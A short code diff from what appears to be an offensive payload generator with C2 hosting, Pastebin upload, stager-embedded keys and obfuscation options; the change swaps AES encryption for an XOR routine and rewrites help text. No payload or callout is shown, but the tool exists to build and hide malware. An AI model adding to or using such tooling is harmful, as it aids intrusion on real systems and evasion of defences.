@@ -153,10 +153,10 @@ def main():
     parser.add_argument('--pastebin',
                         action='store',
                         metavar='API',
-                        help='upload the main payload to Pastebin (instead of the C2 server hosting it)')
+                        help='upload the payload to Pastebin (instead of the C2 server hosting it)')
     parser.add_argument('--encrypt',
                         action='store_true',
-                        help='AES encrypt the main payload with a random 256-bit key embedded in the payload\'s stager',
+                        help='encrypt the payload with a random 128-bit key embedded in the payload\'s stager',
                         default=False)
     parser.add_argument('--obfuscate',
                         action='store_true',
@@ -299,7 +299,7 @@ def _payload(options, **kwargs):
         util.display("\tEncrypting payload... ".format(kwargs['key']), color='reset', style='normal', end=',')
         __load__ = threading.Event()
         __spin__ = _spinner(__load__)
-        output = generators.encrypt(payload, kwargs['key'])
+        output = security.encrypt_xor(payload, kwargs['key'])
         __load__.set()
         _update(payload, output, task='Encryption')
         payload = output
